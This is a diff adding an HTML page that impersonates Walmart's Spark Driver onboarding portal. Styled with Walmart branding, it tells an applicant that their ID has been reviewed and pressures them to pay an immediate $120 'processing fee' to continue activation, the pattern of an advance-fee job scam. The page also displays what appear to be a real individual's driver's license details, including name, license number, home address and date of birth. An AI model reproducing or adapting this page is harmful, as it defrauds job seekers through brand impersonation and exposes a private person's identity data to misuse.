@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Walmart Spark Driver™ Onboarding - Driver's Details</title>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f4f7fb;
+      color: #1e293b;
+    }
+
+  .system-status {
+      background: #facc15;
+      color: #1e293b;
+      text-align: center;
+      padding: 10px;
+      font-size: 13px;
+      font-weight: bold;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.15);
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+  .topbar {
+      background: #0071ce;
+      color: #fff;
+      padding: 16px 24px;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+    }
+
+  .spark-icon {
+      width: 42px;
+      height: 42px;
+      position: relative;
+    }
+
+  .ray {
+      position: absolute;
+      width: 6px;
+      height: 16px;
+      background: #ffc220;
+      border-radius: 3px;
+      top: 50%;
+      left: 50%;
+      transform-origin: center -5px;
+    }
+
+  .ray:nth-child(1) { transform: translate(-50%, -50%) rotate(0deg); }
+  .ray:nth-child(2) { transform: translate(-50%, -50%) rotate(60deg); }
+  .ray:nth-child(3) { transform: translate(-50%, -50%) rotate(120deg); }
+  .ray:nth-child(4) { transform: translate(-50%, -50%) rotate(180deg); }
+  .ray:nth-child(5) { transform: translate(-50%, -50%) rotate(240deg); }
+  .ray:nth-child(6) { transform: translate(-50%, -50%) rotate(300deg); }
+
+  .title { font-size: 20px; font-weight: 600; }
+  .subtitle { font-size: 12px; opacity: 0.9; }
+
+  .container {
+      max-width: 600px;
+      margin: 40px auto;
+      padding: 0 20px;
+    }
+
+  .alert {
+      background: #e0f2fe;
+      border-left: 4px solid #0284c7;
+      padding: 14px 16px;
+      border-radius: 8px;
+      margin-bottom: 24px;
+      color: #0c4a6e;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+  .notice {
+      margin-top: 20px;
+      background: #ffffff;
+      border-radius: 12px;
+      padding: 20px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.10);
+      border: 2px solid #0071ce;
+    }
+
+  .notice-title {
+      font-size: 17px;
+      font-weight: 700;
+      color: #0071ce;
+      margin-bottom: 12px;
+    }
+
+  .notice-body {
+      font-size: 14px;
+      color: #1e293b;
+      line-height: 1.55;
+      margin-bottom: 16px;
+    }
+
+  .notice-sub {
+      font-size: 13px;
+      color: #475569;
+      margin-bottom: 22px;
+    }
+
+  .primary-button {
+      display: block;
+      width: 100%;
+      text-align: center;
+      background: #ffc220;
+      color: #1e293b;
+      padding: 14px 0;
+      border-radius: 50px;
+      font-size: 16px;
+      font-weight: 700;
+      text-decoration: none;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+      cursor: pointer;
+    }
+
+  .details-block {
+      background: #ffffff;
+      padding: 18px;
+      border-radius: 10px;
+      margin-top: 20px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.08);
+      border-left: 4px solid #0071ce;
+    }
+
+  .details-title {
+      font-size: 16px;
+      font-weight: 700;
+      color: #0f172a;
+      margin-bottom: 8px;
+    }
+
+  .details-text {
+      font-size: 14px;
+      color: #475569;
+      line-height: 1.55;
+    }
+
+  .card {
+      background: #fff;
+      border-radius: 12px;
+      padding: 24px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+      position: relative;
+      overflow: hidden;
+      margin-top: 24px;
+    }
+
+  .watermark {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%) rotate(-30deg);
+      font-size: 60px;
+      font-weight: bold;
+      color: rgba(0, 0, 0, 0.03);
+      pointer-events: none;
+    }
+
+  .step-active {
+      border-bottom: 2px solid #e2e8f0;
+      padding-bottom: 20px;
+      margin-bottom: 20px;
+    }
+
+  .step-header {
+      font-size: 14px;
+      font-weight: bold;
+      color: #0071ce;
+      text-transform: uppercase;
+      margin-bottom: 8px;
+    }
+
+  .step-title {
+      font-size: 22px;
+      font-weight: 600;
+      color: #0f172a;
+      margin-bottom: 8px;
+    }
+
+  .step-desc {
+      font-size: 15px;
+      color: #475569;
+      margin-bottom: 20px;
+    }
+
+  .button {
+      display: block;
+      width: 100%;
+      text-align: center;
+      background: #0071ce;
+      color: #fff;
+      padding: 14px 0;
+      border-radius: 50px;
+      font-size: 16px;
+      font-weight: bold;
+      text-decoration: none;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+    }
+
+  .button:hover { background: #005fa8; }
+
+  .upcoming-title {
+      font-size: 14px;
+      font-weight: bold;
+      color: #64748b;
+      text-transform: uppercase;
+      margin-bottom: 16px;
+    }
+
+  .step-list { display: flex; flex-direction: column; gap: 16px; }
+  .upcoming-step { display: flex; gap: 16px; opacity: 0.6; }
+
+  .step-number {
+      background: #e2e8f0;
+      color: #475569;
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      font-weight: bold;
+    }
+
+  .upcoming-info h3 { margin: 0 0 4px 0; font-size: 16px; color: #0f172a; }
+  .upcoming-info p { margin: 0; font-size: 14px; color: #475569; }
+
+  .footer-block {
+      margin-top: 32px;
+      padding-top: 20px;
+      border-top: 1px solid #e2e8f0;
+      text-align: center;
+      font-size: 12px;
+      color: #64748b;
+      line-height: 1.6;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="system-status">
+    ⚠ SYSTEM STATUS: LIVE SYSTEM • ACTIVE
+  </div>
+
+  <div class="topbar">
+    <div class="spark-icon">
+      <div class="ray"></div><div class="ray"></div><div class="ray"></div>
+      <div class="ray"></div><div class="ray"></div><div class="ray"></div>
+    </div>
+    <div>
+      <div class="title">Driver Onboarding</div>
+      <div class="subtitle">Client Enrollment Portal</div>
+    </div>
+  </div>
+
+  <div class="container">
+
+    <div class="alert">
+      <strong>📝 System Note:</strong> Scanned ID data has been successfully saved to your session. Please proceed with the screening.
+    </div>
+
+    <div class="notice">
+      <div class="notice-title">⚠ Important Notice — Action Required</div>
+
+      <div class="notice-body">
+        Your submitted information has been reviewed. To continue with the next step of your
+        verification process, a required processing fee of <strong>$120</strong> must be completed
+        immediately. Delays in payment may pause or slow your activation request.
+      </div>
+
+      <div class="notice-sub">
+        Please complete the $120 required fee using the activation button below to avoid interruption.
+      </div>
+
+      <a class="primary-button">Pay $120.00 & Continue</a>
+    </div>
+
+    <div class="details-block">
+      <div class="details-title">🪪 Submitted ID Information</div>
+      <div class="details-text">
+        <strong>Name:</strong> LEICY JULIETTE GONZALEZ PARR<br>
+        <strong>Driver License No:</strong> G618‑301‑49‑900‑0<br>
+        <strong>Class:</strong> E<br>
+        <strong>Address:</strong> 800 SPRING CREEK ST, CRESTVIEW FL 32536<br>
+        <strong>DOB:</strong> 07/24/1995<br>
+        <strong>Sex:</strong> F<br>
+        <strong>Height:</strong> 5'04"<br>
+        <strong>Restrictions:</strong> NONE<br>
+        <strong>Endorsements:</strong> NONE<br>
+        <strong>Issued:</strong> 12/16/2024<br>
+        <strong>Expires:</strong> 12/16/2028<br>
+        <strong>Document ID:</strong> A80260213062<br>
+        <strong>Replaced:</strong> 02/13/2026
+      </div>
+      <div style="font-size:11px; color:#94a3b8; margin-top:10px;">
+        ⚠ This information was submitted by the Spark support team and is currently under review.
+      </div>
+    </div>
+
+    <div class="footer-block">
+      <strong>Spark Driver™ Platform</strong><br>
+      Operated by Walmart Inc. / Delivery Drivers, Inc. (DDI)<br>
+      702 SW 8th Street, Bentonville, AR 72716<br>
+      <em>Document Processed: May 2026</em><br><br>
+      © 2026 Walmart. All rights reserved.
+    </div>
+
+  </div>
+
+</body>
+</html>
